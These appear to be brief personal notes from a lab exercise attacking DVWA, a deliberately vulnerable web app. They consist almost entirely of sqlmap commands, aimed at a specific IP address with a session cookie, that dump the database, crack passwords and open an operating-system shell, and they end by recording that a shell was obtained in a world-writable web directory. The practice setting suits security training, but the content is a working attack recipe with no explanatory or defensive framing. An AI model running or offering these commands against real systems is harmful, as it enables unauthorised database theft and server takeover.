sqlmap -u "http://34.171.165.162:8000/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=4ae7cff151a35773cb6253368001f1f6" --dump --fresh-queries --os-shell

sqlmap -r dvwa.txt --cookie="security=low; PHPSESSID=4ae7cff151a35773cb6253368001f1f6" --dump 

Crack passwords

sqlmap -r dvwa.txt --cookie="security=high; PHPSESSID=4ae7cff151a35773cb6253368001f1f6" --dump --fresh-queries --os-shell


Got the os-shell at /var/www/dav (has permissions: drwxrwxrwt  2 root     root      4096 May 20  2012 dav)
